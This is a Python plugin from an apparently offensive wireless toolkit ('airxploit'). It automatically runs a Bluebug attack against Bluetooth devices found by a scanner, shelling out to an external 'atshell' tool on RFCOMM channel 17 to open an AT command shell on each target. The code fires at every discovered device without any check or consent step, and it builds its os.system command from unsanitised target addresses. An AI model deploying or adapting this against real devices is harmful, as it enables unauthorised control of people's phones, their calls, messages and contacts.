'''
Created on 05.09.2010

@author: basti
'''

from airxploit.scanner.bluetooth import BluetoothScanner
import logging
import os

class BluebugExploit(object):
    """
    try to connect to channel 17 and spawn an AT command shell
    """
    
    EVENT = "BLUETOOTH_BLUEBUG_FOUND"
    SECTION = "bluebug"

    def __init__(self, pcc):
        self.channel = 17 # TODO: this should be configurable via environment
        self._pcc = pcc
        self._pcc.register_event(BluebugExploit.EVENT)
        self._pcc.register_for_event(BluetoothScanner.EVENT, self)
        self._pcc.register_service("SdpDiscovery", self)
        self.result = []
    
    def run(self):
        """
        run the plugin
        """
        logging.debug(str(self.__class__) + " run()")
        for target in self._pcc.read_all_without_info(BluebugExploit.SECTION):
            logging.debug(str(self.__class__) + " Fireing bluebug exploit on target " + target.addr)
            os.system(self._pcc.get_tool("atshell") + " " + target.addr + " " + str(self.channel) )

    def got_event(self, event):
        """
        event callback function
        """
        logging.debug(str(self.__class__) + " Got event " + event)
        self.run()
